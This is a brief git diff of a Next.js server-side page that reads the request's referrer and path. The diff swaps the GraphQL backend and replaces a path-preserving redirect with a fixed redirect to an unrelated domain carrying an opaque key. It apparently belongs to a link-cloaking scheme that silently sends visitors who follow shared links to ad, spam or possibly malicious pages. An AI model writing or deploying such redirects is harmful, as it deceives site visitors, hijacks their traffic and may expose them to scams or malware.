@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://photo-hunter.free.nf/graphql"
+	const endpoint = "https://dev-knowledge-news.pantheonsite.io/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://photo-hunter.free.nf/` + encodeURI(path as string)
+					`https://drugstoredemuretake.com/aqk6qtqp6m?key=bd68087c90734851688a6b2e9705502c/`
 				}`,
 			},
 		};
